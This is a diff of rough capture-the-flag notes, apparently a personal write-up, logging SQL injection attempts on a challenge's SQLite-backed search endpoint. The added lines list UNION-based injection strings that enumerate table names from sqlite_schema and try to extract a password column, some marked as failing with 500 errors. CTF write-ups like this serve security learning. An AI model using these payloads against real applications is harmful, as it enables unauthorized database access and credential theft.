@@ -107,7 +107,17 @@ def search():
 - https://www.sqlite.org/schematab.html
 - `a%'union select name from sqlite_schema/*` this does give a lot of info
 - ![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/ace9ce66-2470-4753-8f09-966567c1c3ac)
-- a%'union select password from table_{id}/*
+- a%'union select name from sqlite_schema where name=table_{id}/*
+-  a%'union select name from sqlite_schema where name LIKE 'table_%'/* --gives all tables with table_
+- `a%'union select name from sqlite_schema where name LIKE 'table_{id}'/*` --does give our table
+-  ![image](https://github.com/m0wn1ka/ctf_writeups/assets/127676379/f2f5b791-7cd1-4450-bc05-005762b6c41b)
+-  a%'union select name from sqlite_schema where name LIKE 'table_'/*
+-  a%'union select name from sqlite_schema where name LIKE 'table_{id}';select '111'/*
+-  ` a%'union select password from table_{id}/*` --500
+-  
+-   ` a%'union select table_{id}/*` --500
+
+- a%'union select password from table_{id}/*- 500
 - INSERT INTO table (column1,column2 ,..) VALUES( value1,	value2 ,...)
 - `SELECT name 
 FROM (
